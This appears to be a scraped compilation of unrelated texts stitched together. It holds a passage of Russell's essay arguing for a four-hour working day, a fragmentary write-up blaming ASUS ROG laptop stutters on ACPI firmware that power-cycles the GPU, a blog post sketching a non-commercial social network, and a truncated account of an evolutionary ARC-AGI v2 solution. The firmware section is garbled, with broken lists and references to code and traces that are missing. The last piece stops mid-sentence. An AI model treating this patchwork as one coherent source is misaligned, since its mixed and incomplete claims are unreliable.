<p>Modern technic has made it possible to diminish enormously the amount of labor necessary to produce the necessaries of life for every one. This was made obvious during the War. At that time all the men in the armed forces, all the men and women engaged in the production of munitions, all the men and women engaged in spying, war propaganda, or government offices connected with the War were withdrawn from productive occupations. In spite of this, the general level of physical well-being among wage-earners on the side of the Allies was higher than before or since. The significance of this fact was concealed by finance; borrowing made it appear as if the future was nourishing the present. But that, of course, would have been impossible; a man cannot eat a loaf of bread that does not yet exist. The War showed conclusively that by the scientific organization of production it is possible to keep modern populations in fair comfort on a small part of the working capacity of the modern world. If at the end of the War the scientific organization which had been created in order to liberate men for fighting and munition work had been preserved, and the hours of work had been cut down to four, all would have been well. Instead of that, the old chaos was restored, those whose work was demanded were made to work long hours, and the rest were left to starve as unemployed. Why? Because work is a duty, and a man should not receive wages in proportion to what he has produced, but in proportion to his virtue as exemplified by his industry.</p>
<p>This is the morality of the Slave State, applied in circumstances totally unlike those in which it arose. No wonder the result has been disastrous. Let us take an illustration. Suppose that at a given moment a certain number of people are engaged in the manufacture of pins. They make as many pins as the world needs, working (say) eight hours a day. Someone makes an invention by which the same number of men can make twice as many pins as before. But the world does not need twice as many pins: pins are already so cheap that hardly any more will be bought at a lower price. In a sensible world everybody concerned in the manufacture of pins would take to working four hours instead of eight, and everything else would go on as before. But in the actual world this would be thought demoralizing. The men still work eight hours, there are too many pins, some employers go bankrupt, and half the men previously concerned in making pins are thrown out of work. There is, in the end, just as much leisure as on the other plan, but half the men are totally idle while half are still overworked. In this way it is insured that the unavoidable leisure shall cause misery all round instead of being a universal source of happiness. Can anything more insane be imagined?</p>
<p>The idea that the poor should have leisure has always been shocking to the rich. In England in the early nineteenth century fifteen hours was the ordinary day’s work for a man; children sometimes did as much, and very commonly did twelve hours a day. When meddlesome busy-bodies suggested that perhaps these hours were rather long, they were told that work kept adults from drink and children from mischief. When I was a child, shortly after urban working men had acquired the vote, certain public holidays were established by law, to the great indignation of the upper classes. I remember hearing an old Duchess say, “What do the poor want with holidays? they ought to <em>work.</em>” People nowadays are less frank, but the sentiment persists, and is the source of much economic confusion.</p>

<p>II</p>
<p>Let us, for a moment, consider the ethics of work frankly, without superstition. Every human being, of necessity, consumes in the course of his life a certain amount of produce of human labor. Assuming, as we may, that labor is on the whole disagreeable, it is unjust that a man should consume more than he produces. Of course he may provide services rather than commodities, like a medical man, for example; but he should provide something in return for his board and lodging. To this extent, the duty of work must be admitted, but to this extent only.</p>
<p>I shall not develop the fact that in all modern societies outside the U.&nbsp;S.&nbsp;S.&nbsp;R. many people escape even this minimum of work, namely all those who inherit money and all those who marry money. I do not think the fact that these people are allowed to be idle is nearly so harmful as the fact that wage-earners are expected to overwork or starve. If the ordinary wage-earner worked four hours a day there would be enough for everybody, and no unemployment&nbsp;— assuming a certain very moderate amount of sensible organization. This idea shocks the well-to-do, because they are convinced that the poor would not know how to use so much leisure. In America men often work long hours even when they are already well-off; such men, naturally, are indignant at the idea of leisure for wage-earners except as the grim punishment of unemployment, in fact, they dislike leisure even for their sons. Oddly enough, while they wish their sons to work so hard as to have no time to be civilized, they do not mind their wives and daughters having no work at all. The snobbish admiration of uselessness, which, in an aristocratic society, extends to both sexes, is under a plutocracy confined to women; this, however, does not make it any more in agreement with common sense.</p>
<p>The wise use of leisure, it must be conceded, is a product of civilization and education. A man who has worked long hours all his life will be bored if he becomes suddenly idle. But without a considerable amount of leisure a man is cut off from many of the best things. There is no longer any reason why the bulk of the population should suffer this deprivation; only a foolish asceticism, usually vicarious, makes us insist on work in excessive quantities now that the need no longer exists.</p>
<p>In the new creed which controls the government of Russia, while there is much that is very different from the traditional teaching of the West, there are some things that are quite unchanged. The attitude of the governing classes, and especially of those who control educational propaganda, on the subject of the dignity of labor is almost exactly that which the governing classes of the world have always preached to what were called the “honest poor.” Industry, sobriety, willingness to work long hours for distant advantages, even submissiveness to authority, all these reappear; moreover, authority still represents the will of the Ruler of the Universe, Who, however, is now called by a new name, Dialectical Materialism.</p>
<p>The victory of the proletariat in Russia has some points in common with the victory of the feminists in some other countries. For ages men had conceded the superior saintliness of women and had consoled women for their inferiority by maintaining that saintliness is more desirable than power. At last the feminists decided that they would have both, since the pioneers among them believed all that the men had told them about the desirability of virtue but not what they had told them about the worthlessness of political power. A similar thing has happened in Russia as regards manual work. For ages the rich and their sycophants have written in praise of “honest toil,” have praised the simple life, have professed a religion which teaches that the poor are much more likely to go to heaven than the rich, and in general have tried to make manual workers believe that there is some special nobility about altering the position of matter in space, just as men tried to make women believe that they derived some special nobility from their sexual enslavement. In Russia all this teaching about the excellence of manual work has been taken seriously, with the result that the manual worker is more honored than anyone else. What are, in essence, revivalist appeals are made to secure shock workers for special tasks. Manual work is the ideal which is held before the young, and is the basis of all ethical teaching.</p>
<p>For the present this is all to the good. A large country, full of natural resources, awaits development and has to be developed with very little use of credit. In these circumstances hard work is necessary and is likely to bring a great reward. But what will happen when the point has been reached where everybody could be comfortable without working long hours?</p>
<p>In the West we have various ways of dealing with this problem. We have no attempt at economic justice, so that a large proportion of the total produce goes to a small minority of the population, many of whom do no work at all. Owing to the absence of any central control over production, we produce hosts of things that are not wanted. We keep a large percentage of the working population idle because we can dispense with their labor by making others overwork. When all these methods prove inadequate we have a war: we cause a number of people to manufacture high explosives, and a number of others to explode them, as if we were children who had just discovered fireworks. By a combination of all these devices we manage, though with difficulty, to keep alive the notion that a great deal of manual work must be the lot of the average man.</p>
<p>In Russia, owing to economic justice and central control over production, the problem will have to be differently solved. The rational solution would be as soon as the necessaries and elementary comforts can be provided for all to reduce the hours of labor gradually, allowing a popular vote to decide, at each stage, whether more leisure or more goods were to be preferred. But, having taught the supreme virtue of hard work, it is difficult to see how the authorities can aim at a paradise in which there will be much leisure and little work. It seems more likely that they will find continually fresh schemes by which present leisure is to be sacrificed to future productivity. I read recently of an ingenious scheme put forward by Russian engineers for making the White Sea and the northern coasts of Siberia warm by putting a dam across the Kara Straits. An admirable plan, but liable to postpone proletarian comfort for a generation, while the nobility of toil is being displayed amid the ice-fields and snowstorms of the Arctic Ocean. This sort of thing, if it happens, will be the result of regarding the virtue of hard work as an end in itself, rather than as a means to a state of affairs in which it is no longer needed.</p>

<p>III</p>
<p>The fact is that moving matter about, while a certain amount of it is necessary to our existence, is emphatically not one of the ends of human life. If it were, we should have to consider every navvy superior to Shakespeare. We have been misled in this matter by two causes. One is the necessity of keeping the poor contented, which has led the rich for thousands of years to preach the dignity of labor, while taking care themselves to remain undignified in this respect. The other is the new pleasure in mechanism, which makes us delight in the astonishingly clever changes that we can produce on the earth’s surface. Neither of these motives makes any great appeal to the actual worker. If you ask him what he thinks the best part of his life, he is not likely to say, “I enjoy manual work because it makes me feel that I am fulfilling man’s noblest task, and because I like to think how much man can transform his planet. It is true that my body demands periods of rest, which I have to fill in as best I may, but I am never so happy as when the morning comes and I can return to the toil from which my contentment springs.” I have never heard working men say this sort of thing. They consider work, as it should be considered, as a necessary means to a livelihood, and it is from their leisure hours that they derive whatever happiness they may enjoy.</p>
<p>It will be said that while a little leisure is pleasant, men would not know how to fill their days if they had only four hours’ work out of the twenty-four. In so far as this is true in the modern world it is a condemnation of our civilization; it would not have been true at any earlier period. There was formerly a capacity for light-heartedness and play which has been to some extent inhibited by the cult of efficiency. The modern man thinks that everything ought to be done for the sake of something else, and never for its own sake. Serious-minded persons, for example, are continually condemning the habit of going to the cinema, and telling us that it leads the young into crime. But all the work that goes to producing a cinema is respectable, because it is work, and because it brings a money profit. The notion that the desirable activities are those that bring a profit has made everything topsy-turvy. The butcher who provides you with meat and the baker who provides you with bread are praiseworthy because they are making money but when you enjoy the food they have provided you are merely frivolous, unless you eat only to get strength for your work. Broadly speaking, it is held that getting money is good and spending money is bad. Seeing that they are two sides of one transaction, this is absurd; one might as well maintain that keys are good but keyholes are bad. The individual, in our society, works for profit; but the social purpose of his work lies in the consumption of what he produces. It is this divorce between the individual and the social purpose of production that makes it so difficult for men to think clearly in a world in which profitmaking is the incentive to industry. We think too much of production and too little of consumption. One result is that we attach too little importance to enjoyment and simple happiness, and that we do not judge production by the pleasure that it gives to the consumer.</p>
<p>When I suggest that working hours should be reduced to four, I am not meaning to imply that all the remaining time should necessarily be spent in pure frivolity. I mean that four hours’ work a day should entitle a man to the necessities and elementary comforts of life, and that the rest of his time should be his to use as he might see fit. It is an essential part of any such social system that education should be carried farther than it usually is at present, and should aim, in part, at providing tastes which would enable a man to use leisure intelligently. I am not thinking mainly of the sort of things that would be considered “high-brow.” Peasant dances have died out except in remote rural areas, but the impulses which caused them to be cultivated must still exist in human nature. The pleasures of urban populations have become mainly passive: seeing cinemas, watching football matches, listening to the radio, and so on. This results from the fact that their active energies are fully taken up with work; if they had more leisure they would again enjoy pleasures in which they took an active part.</p>
<p>In the past there was a small leisure class and a large working class. The leisure class enjoyed advantages for which there was no basis in social justice; this necessarily made it oppressive, limited its sympathies, and caused it to invent theories by which to justify its privileges. These facts greatly diminished its excellence, but in spite of this drawback it contributed nearly the whole of what we call civilization. It cultivated the arts and discovered the sciences; it wrote the books, invented the philosophies, and refined social relations. Even the liberation of the oppressed has usually been inaugurated from above. Without the leisure class mankind would never have emerged from barbarism.</p>
<p>The method of a hereditary leisure class without duties was, however, extraordinarily wasteful. None of the members of the class had been taught to be industrious, and the class as a whole was not exceptionally intelligent. It might produce one Darwin, but against him had to be set tens of thousands of country gentlemen who never thought of anything more intelligent than fox-hunting and punishing poachers. At present, the universities are supposed to provide, in a more systematic way, what the leisure class provided accidentally and as a byproduct. This is a great improvement, but it has certain drawbacks. University life is so different from life in the world at large that men who live in an academic milieu tend to be unaware of the pre-occupations of ordinary men and women; moreover, their ways of expressing themselves are usually such as to rob their opinions of the influence that they ought to have upon the general public. Another disadvantage is that in universities studies are organized, and the man who thinks of some original line of research is likely to be discouraged. Academic institutions, therefore, useful as they are, are not adequate guardians of the interests of civilization in a world where every one outside their walls is too busy for unutilitarian pursuits.</p>
<p>In a world where no one is compelled to work more than four hours a day every person possessed of scientific curiosity will be able to indulge it, and every painter will be able to paint without starving, however excellent his pictures may be. Young writers will not be obliged to draw attention to themselves by sensational pot-boilers, with a view to acquiring the economic independence needed for monumental works, for which, when the time at last comes, they will have lost the taste and the capacity. Men who in their professional work have become interested in some phase of economics or government will be able to develop their ideas without the academic detachment that makes the work of university economists lacking in reality. Medical men will have time to learn about the progress of medicine. Teachers will not be exasperatedly struggling to teach by routine things which they learned in their youth, which may, in the interval, have been proved to be untrue.</p>
<p>Above all, there will be happiness and joy of life, instead of frayed nerves, weariness, and dyspepsia. The work exacted will be enough to make leisure delightful, but not enough to produce exhaustion. Since men will not be tired in their spare time, they will not demand only such amusements as are passive and vapid. At least one per cent will probably devote the time not spent in professional work to pursuits of some public importance, and, since they will not depend upon these pursuits for their livelihood, their originality will be unhampered, and there will be no need to conform to the standards set by elderly pundits. But it is not only in these exceptional cases that the advantages of leisure will appear. Ordinary men and women, having the opportunity of a happy life, will become more kindly and less persecuting and less inclined to view others with suspicion. The taste for war will die out, partly for this reason, and partly because it will involve long and severe work for all. Good nature is, of all moral qualities, the one that the world needs most, and good nature is the result of ease and security, not of a life of arduous struggle. Modern methods of production have given us the possibility of ease and security for all; we have chosen instead to have overwork for some and starvation for others. Hitherto we have continued to be as energetic as we were before there were machines. In this we have been foolish, but there is no reason to go on being foolish for ever.</p>

<p dir="auto">You own a high-end ASUS ROG laptop perhaps a Strix, Scar, or Zephyrus. It's specifications are impressive: an RTX 30/40 series GPU, a top-tier Intel processor, and plenty of RAM. Yet, it stutters during basic tasks like watching a YouTube video, audio crackles and pops on Discord calls, the mouse cursor freezes for a split second, just long enough to be infuriating.</p>
<p dir="auto">You've likely tried all the conventional fixes:</p>
<ul dir="auto">
<li>Updating every driver imaginable, multiple times.</li>
<li>Performing a "clean" reinstallation of Windows.</li>
<li>Disabling every conceivable power-saving option.</li>
<li>Manually tweaking processor interrupt affinities.</li>
<li>Following convoluted multi-step guides from Reddit threads.</li>
<li>Even installing Linux, only to find the problem persists.</li>
</ul>
<p dir="auto">If none of that worked, it's because the issue isn't with the operating system or a driver. The problem is far deeper, embedded in the machine's firmware, the BIOS.</p>

<p dir="auto">CPU 0 is taking the brunt of the impact, spending over 90 seconds processing interrupts while other cores remain largely unaffected. This isn't a failure of load balancing; it's a process locked to a single core.</p>
<p dir="auto">A similar test on a Scar 15 from 2022 shows the exact same culprit: high DPC latency originating from <code>ACPI.sys</code>.</p>

<p dir="auto">It's easy to blame a Windows driver, but <code>ACPI.sys</code> is not a typical driver. It primarily functions as an interpreter for ACPI Machine Language (AML), the code provided by the laptop's firmware (BIOS). If <code>ACPI.sys</code> is slow, it's because the firmware is feeding it inefficient or flawed AML code to execute. These slowdowns are often triggered by General Purpose Events (GPEs) and traffic from the Embedded Controller (EC). To find the true source, we must dig deeper.</p>

<p dir="auto">Random interruptions often suggest hardware faults or thermal throttling. A perfectly repeating pattern points to a systemic issue, a timer or a scheduled event baked into the system's logic.</p>

<p dir="auto">This power cycling is nonsensical because the laptop is configured for a scenario where it is impossible: <strong>The system is in Ultimate Mode (via a MUX switch) with an external display connected.</strong></p>
<p dir="auto">In this mode:</p>
<ul dir="auto">
<li>The discrete NVIDIA GPU (dGPU) is the <strong>only</strong> active graphics processor.</li>
<li>The integrated Intel GPU (iGPU) is completely powered down and bypassed.</li>
<li>The dGPU is wired directly to the internal and external displays.</li>
<li>There is no mechanism for switching between GPUs.</li>
</ul>
<p dir="auto">Yet, the firmware is relentlessly trying to power cycle the dGPU every 15-30 seconds. The dGPU in mux mode isn't just "preferred" - it's the ONLY path to the display. There's no fallback, and no alternative. When the firmware sends <code>_PS3</code> (power off), it's attempting something architecturally impossible.</p>
<p dir="auto">Most of the time, hardware sanity checks refuse these nonsensical commands, but even failed attempts introduce latency spikes causing audio dropouts, input lag, and accumulating performance degradation. Games freeze mid-session, videos buffer indefinitely, system responsiveness deteriorates until restart.</p>

<p dir="auto">Sometimes, under specific thermal conditions or race conditions, the power-down actually succeeds. When the firmware manages to power down the GPU that's driving the display, the sequence is predictable and catastrophic:</p>
<ol dir="auto">
<li><strong>Firmware executes <code>_PS3</code></strong> - GPU power off command</li>

<li><strong>GPU enters impossible state</strong> - firmware insists OFF, Windows needs ON</li>
<li><strong>Driver thread blocks indefinitely</strong> - waiting for GPU response</li>

<p dir="auto">The crash dump confirms the thread is stuck in <code>win32kbase!DrvSetWddmDeviceMonitorPowerState</code>, waiting for the NVIDIA driver to respond. It can't because it's caught between a confused power state, windows wanting to turn on the GPU while the firmware is arming the GPU cut off.</p>

<li>Allow the kernel to schedule other threads.</li>
<li>Update system timers.</li>
</ul>
<p dir="auto"><strong>Wtf 2: Time-Sliced Interrupt Processing</strong>
The entire loop is designed to run for an extended period, processing events in batches. It's effectively a poorly designed task scheduler running inside an interrupt handler, capable of holding a CPU core hostage for potentially seconds at a time.</p>

<p dir="auto">These notifications (<code>0xD1</code>, <code>0xD2</code>, etc.) are hardware-specific signals that tell the NVIDIA driver to re-evaluate its power state, which is what triggers the futile <code>_PS0/_DOS/_PS3</code> power-cycling sequence seen in the traces.</p>

<p dir="auto">Here's where a simple but catastrophic oversight in the firmware's logic causes system-wide failure. High-end ASUS gaming laptops feature a MUX (Multiplexer) switch, a piece of hardware that lets the user choose between two distinct graphics modes:</p>
<ol dir="auto">
<li><strong>Optimus Mode:</strong> The power-saving default. The integrated Intel GPU (iGPU) is physically connected to the display. The powerful NVIDIA GPU (dGPU) only renders demanding applications when needed, passing finished frames to the iGPU to be drawn on screen.</li>
<li><strong>Ultimate/Mux Mode:</strong> The high-performance mode. The MUX switch physically rewires the display connections, bypassing the iGPU entirely and wiring the NVIDIA dGPU directly to the screen. In this mode, the dGPU is not optional; it is the <strong>only</strong> graphics processor capable of outputting an image.</li>
</ol>
<p dir="auto">Any firmware managing this hardware <strong>must</strong> be aware of which mode the system is in. Sending a command intended for one GPU to the other is futile and, in some cases, dangerous. Deep within the ACPI code, a hardware status flag named <code>HGMD</code> is used to track this state. To understand the flaw, we first need to decipher what <code>HGMD</code> means, and the firmware itself gives us the key.</p>
<p dir="auto"><h4 tabindex="-1" dir="auto"><strong>Decoding the Firmware's Logic with the Brightness Method</strong></h4><a id="user-content-decoding-the-firmwares-logic-with-the-brightness-method" aria-label="Permalink: Decoding the Firmware's Logic with the Brightness Method" href="#decoding-the-firmwares-logic-with-the-brightness-method"></a></p>
<p dir="auto">For screen brightness to work, the command must be sent to the GPU that is physically controlling the display backlight. A command sent to the wrong GPU will simply do nothing. Therefore, the brightness control method (<code>BRTN</code>) <em>must</em> be aware of the MUX switch state to function at all. It is the firmware's own Rosetta Stone.</p>

<p dir="auto">The logic here is flawless and revealing. The code uses the <code>HGMD</code> flag to make a binary decision. If <code>HGMD</code> is <code>0x03</code>, it sends the command to the NVIDIA GPU. If not, it sends it to the Intel GPU. The firmware itself, through this correct implementation, provides the undeniable definition: <strong><code>HGMD == 0x03</code> means the system is in Ultimate/Mux Mode.</strong></p>

<p dir="auto">This is the bug. The firmware, despite proving it knows how to check the MUX state, forgets to do so here. It blindly sends a power-management notification to the NVIDIA driver, instructing it to change power states. In MUX mode, this command is nonsensical it's asking the driver to power down the only GPU that is keeping the screen on. This triggers the futile power-cycling, the massive latency spikes, and the system instability.</p>

<p dir="auto">Once again, the firmware prepares to cut power to the discrete GPU without first checking if it's the only GPU driving the displays. This demonstrates that the Mux Mode Confusion is a systemic design flaw. The firmware is internally inconsistent, leading it to issue self-destructive commands that try to cripple the system.</p>

<p dir="auto">Microsoft has a built-in "smooth video" check. It plays HD video in full screen and watches for hiccups. If the PC drops frames, crackles, or any driver pauses for more than a few milliseconds, it fails. That’s Microsoft’s baseline for what "smooth" should look like.</p>

<p dir="auto">ASUS firmware is causing millisecond-long pauses. Those pauses are exactly the kind that make this test fail i.e., the same stutters and audio pops regular users notice on YouTube/Netflix and games; this firmware violates fundemental standards.</p>

<li><strong>Logical Proof:</strong> The code lacks critical checks for the laptop's hardware state (MUX mode).</li>
<li><strong>Systemic Proof:</strong> The issue is reproducible across different models and BIOS versions.</li>

<p dir="auto">Until a fix is implemented, millions of buyers of Asus laptops from approx. 2021 to present day are facing stutters on the simplest of tasks, such as watching YouTube, for the simple mistake of using a sleep call inside of an inefficient interrupt handler and not checking the GPU environment properly.</p>

    <p>People often assume that I hate social media. And they'd be forgiven for believing that, since I am overtly critical of current social media platforms and the effects they have on individuals and society; and <a href="https://herman.bearblog.dev/quitting-social-media/">deleted all of my social media accounts back in 2019</a>.</p>
<p>However, the underlying concept of social media is something I resonate with: Stay connected with the people you care about.</p>
<p>It's just that the current form of social media is bastardised, and not social at all. Instead of improving relationships and fostering connection, they're advertisement-funded content mills which are explicitly designed and continually refined to keep you engaged, lonely, and unhappy. And once TikTok figured out that short-form video with a recommendation engine is digital crack, all other social media platforms quickly sprang into action to copy their secret sauce.</p>
<p>Meta basically turned Instagram and Facebook from 'connecting with friends' into 'doom-scrolling random content'. Even Pinterest is starting to look like TikTok! They followed user engagement, but not the underlying preferences of their users. I posit that any for-profit social media will eventually degrade into recommendation media over time.</p>
<p>I don't think most people using these platforms understand that they are the product. Instagram isn't built for you. It's built for marketers. It's built for celebrities to capitalise on their audiences. It's built for politicians and their cronies to sway sentiment. It's built to be as addictive as possible, and to capitalise on your insecurity and uncomfortability.</p>
<p>Imagine that, society and politics are on the rocks all so a fitness influencer can sell you their "Abs in 30 days" training program.</p>
<p>These platforms are the quintessential poster child for late-stage capitalism.</p>
<p>Okay, now that we've established what the problems with current platforms are—what would a non-evil social media platform look like?</p>
<p>I'd love to see everyone running a blog, and subscribing to the people they care about via RSS. But unfortunately this doesn't scale since it requires effort to put your thoughts down in writing longer than 255 characters. I have many friends who don't even know I have a blog, or what an RSS reader is.</p>
<p>So while everyone blogging may be the ideal we can aspire to, let's design a hypothetical social media platform that takes the good aspects of current social media, while creating pro-social incentives.</p>
<p>The platform should be about:</p>
<ul>
<li>Keeping up with friends, family, and other acquaintances</li>
<li>Connection (but, you know, real connection)</li>
<li>Improving relationships</li>
<li>Thoughtful engagement</li>
</ul>
<p>The platform should NOT be about:</p>
<ul>
<li>Collecting followers</li>
<li>Self-promotion</li>
<li>Advertising and marketing</li>
<li>Short-form video and media entertainment</li>
</ul>
<p>In my opinion, as soon as there is the ability for commercial interests to take hold, they will. The "follow" mechanism is a key part of that. I propose that instead of followers we should regress back to the "friend" or "connection" system where there is a symmetric relationship where both people have to agree to the connection. There is no good reason to have "followers" on a platform that is trying to improve relationships. "Following" is purely for egotistical or financial gain and breeds parasocial relationships.</p>
<p>I think there should also be a reasonable cap on the number of connections that can be made. Something like 300 friends sounds right. Any more than that and you're a collector, and not using the platform to foster connection.</p>
<p>This feature alone already removes 90% of the marketing interests in the platform. Do you want to make a connection, but are maxed out? You'll need to unfriend someone first.</p>
<p>The second necessary element would be a chronological feed with posts from your connections. This turns the platform from an engagement engine into a way to keep up with what everyone else is doing, but importantly, gives you a natural "end" to the feed when you start seeing posts you've already viewed. This way when you start scrolling there's an explicit stopping point.</p>
<p>Relatedly, pagination is more humane than infinite-scroll since it gives users a natural breathing point where they can decide whether they want to keep going. Infinite-scroll is such an obvious user-trap, and I view any website doing it as not having its user's best interests at heart.</p>
<p>And finally, there should be a reasonable cap on the number of times a user can post per day. Roughly 5 times per day feels like the upper threshold of what you can post while being intentional about what it is you're posting. This will keep the feed reasonably populated without one or two people completely overwhelming it.</p>
<p>The rest of the platform can be optimised to be as easy-to-use as possible. Something like a mixture between the old Instagram and Twitter, with comments and reactions. No reels or any other recommendation system to keep people engaged to death. And no analytics, since that would be optimising for reach and engagement instead of the stated goal of connection.</p>
<p>Do I expect a platform like this to succeed? Not by the traditional metrics of success. In the real world it would exist alongside the content mills, which are exciting by design and competing for attention. Could it work in niche groups, or amongst intentional people who are sick of the current platforms? Maybe.</p>
<p>Naturally, a project like this would have to be funded somehow, and unfortunately very few people are willing to pay $5 per month for software services, even if they use it every day. However, I suspect that a social media platform like this would be manageable enough that a small team could run it fairly cheaply and profitably if they're creative. Perhaps with nothing but donations.</p>
<p>Who will create this egalitarian social media? Not me, that's for sure. I already have my fair share of work moderating the <a href="https://bearblog.dev/discover/">Bear discovery feed</a>, to the extent I've had to bring on a second moderator (hello Sheena!) to keep it clean of spam and other nasty things that free services on the internet attract.</p>
<p>That being said, I would love to see something like this. I'd love to be able to stay connected with friends and family abroad without having my attention sold to the highest bidder.</p>
<p>If anyone is working on something like this, I'd be happy to consult.</p>

What makes it notable is the stark performance gap between humans and AI: while humans can readily solve these puzzles, LLMs struggle significantly. The test presents novel patterns through a few examples and then challenges the test-taker to continue the sequence, measuring their ability to identify and generalize underlying rules they've never encountered before.</span></p><p>Let’s look at a real challenge.

Smart humans can get 100% accuracy on a batch of 100 challenges. In contrast, the best LLMs get only 16%. You can find the leaderboard </span><a href="https://arcprize.org/leaderboard" rel="">here</a><span>.</span></p><p>It’s worth reading my v1 solution first, which goes into deeper technical details about how the architecture works.</p><p>My original solution used language models to generate Python functions to solve tasks. This approach had a key advantage: functions are deterministic and testable. I could generate hundreds of candidate functions, rank them by their performance on training examples, and evolve better solutions from the highest-scoring ones.</p><p>This strategy hits a wall with ARC v2. The transformations are often too complex to express elegantly in Python—they require nuanced pattern recognition and contextual understanding that would result in unwieldy, brittle code. So I turned to a language much older than Python: English.</p><p>My v2 solution is essentially the same evolutionary architecture, but it evolves natural language instructions instead of code.</p><p>For each task, I use a language model to generate plain-English instructions describing how to transform input grids to output grids. To evaluate these instructions, I have a sub-agent model apply them to the training examples—treating each training grid as if it were the test grid and generating what it believes is the correct output. This gives me a fitness score for each instruction based on how many training examples it solves correctly (or partially, counting the percentage of correct cells).</p><p><span>Once I have a population of scored instructions, the evolution begins through two distinct revision strategies: </span><strong>individual</strong><span> and </span><strong>pooled</strong><span>.</span></p><p><strong>Individual revisions</strong><span> take a single instruction along with its generated outputs and the ground truth. The model sees both the raw grids and an ASCII diff highlighting the discrepancies. Armed with this feedback, it refines the instruction to correct its mistakes.</span></p><p><strong>Pooled revisions</strong><span> follow the same principle but combine multiple instructions into a single context. The model is prompted to synthesize a new instruction that incorporates the successful elements from each parent instruction.</span></p><p><span>The full prompts are in the footnotes.</span><span><a data-component-name="FootnoteAnchorToDOM" id="footnote-anchor-1-173725986" href="https://jeremyberman.substack.com/p/how-i-got-the-highest-score-on-arc-agi-again#footnote-1-173725986" target="_self" rel="">1</a></span></p><p>You might expect pooled revisions to always outperform individual ones—after all, more context should mean better results. In practice, it's not that simple. Thinking models generate extensive reasoning tokens, and for many ARC tasks, including more than two instructions causes the context to exceed token limits, stalling the response. Moreover, like humans, language models can lose focus when overwhelmed with information. Sometimes the additional context from multiple instructions actually degrades reasoning performance rather than enhancing it.</p><p>After extensive experimentation, I converged on this design:</p><ol><li><p><strong>Initial generation</strong><span>: Use Grok-4 to generate 30 candidate instructions</span></p></li><li><p><strong>Individual revision phase</strong><span>: If no perfect solutions emerge, take the top 5 instructions and run each through individual revision</span></p></li><li><p><strong>Pooled revision phase</strong><span>: If still no perfect solutions, take the 5 highest-scoring instructions, create a pooled revision prompt, and generate 5 new candidates from it</span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/$s_!U-Xx!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F682f2f3b-2670-4c64-9f1d-eedce512a64c_1774x3840.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/$s_!U-Xx!,w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F682f2f3b-2670-4c64-9f1d-eedce512a64c_1774x3840.png 424w, https://substackcdn.com/image/fetch/$s_!U-Xx!,w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F682f2f3b-2670-4c64-9f1d-eedce512a64c_1774x3840.png 848w, https://substackcdn.com/image/fetch/$s_!U-Xx!,w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F682f2f3b-2670-4c64-9f1d-eedce512a64c_1774x3840.png 1272w, https://substackcdn.com/image/fetch/$s_!U-Xx!,w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F682f2f3b-2670-4c64-9f1d-eedce512a64c_1774x3840.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/$s_!U-Xx!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F682f2f3b-2670-4c64-9f1d-eedce512a64c_1774x3840.png" width="278" height="601.8241758241758" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/682f2f3b-2670-4c64-9f1d-eedce512a64c_1774x3840.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:3152,&quot;width&quot;:1456,&quot;resizeWidth&quot;:278,&quot;bytes&quot;:267693,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://jeremyberman.substack.com/i/173725986?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F682f2f3b-2670-4c64-9f1d-eedce512a64c_1774x3840.png&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null,&quot;offset&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/$s_!U-Xx!,w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F682f2f3b-2670-4c64-9f1d-eedce512a64c_1774x3840.png 424w, https://substackcdn.com/image/fetch/$s_!U-Xx!,w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F682f2f3b-2670-4c64-9f1d-eedce512a64c_1774x3840.png 848w, https://substackcdn.com/image/fetch/$s_!U-Xx!,w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F682f2f3b-2670-4c64-9f1d-eedce512a64c_1774x3840.png 1272w, https://substackcdn.com/image/fetch/$s_!U-Xx!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F682f2f3b-2670-4c64-9f1d-eedce512a64c_1774x3840.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div></li></ol><p>In the worst case (when solutions aren't found until the final step), this produces 40 total instruction attempts per task: 30 initial + 5 individual revisions + 5 pooled revisions. This balance provides enough exploration in the initial phase, focused refinement in the individual revision phase, and creative recombination in the pooled phase—all while staying within computational constraints.</p><p>I agree with François Chollet's definition of AGI: a system that can efficiently acquire new skills outside of its training data. In practical terms, we'll know we've achieved AGI when we can no longer create tasks that are easy for humans but hard for AI.</p><p>ARC-AGI exemplifies this gap well. LLMs are PhD-level reasoners in math and science, yet they fail at children's puzzles. How is this possible?</p><p>When LLMs try to solve ARC tasks, they don't just fail, they fail in ways that violate basic logic. I have 100k+ traces of thinking models generating 